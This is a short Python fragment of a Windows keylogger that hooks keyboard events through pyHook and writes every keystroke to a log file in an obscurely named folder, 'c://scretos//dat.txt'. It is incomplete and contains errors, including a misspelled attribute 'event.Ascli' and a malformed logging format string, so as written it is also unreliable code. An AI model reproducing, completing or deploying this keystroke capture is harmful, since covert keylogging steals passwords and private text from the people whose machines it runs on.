import pythoncom, sys, logging, pyHook
import time, datetime

file_log='c://scretos//dat.txt'

def OnKeyboardEvent(event):
    logging.basicConfig(filename=file_log, level=logging.DEBUG,
  format='#(message)#')


    logging.log(10, chr(event.Ascli))
    return True


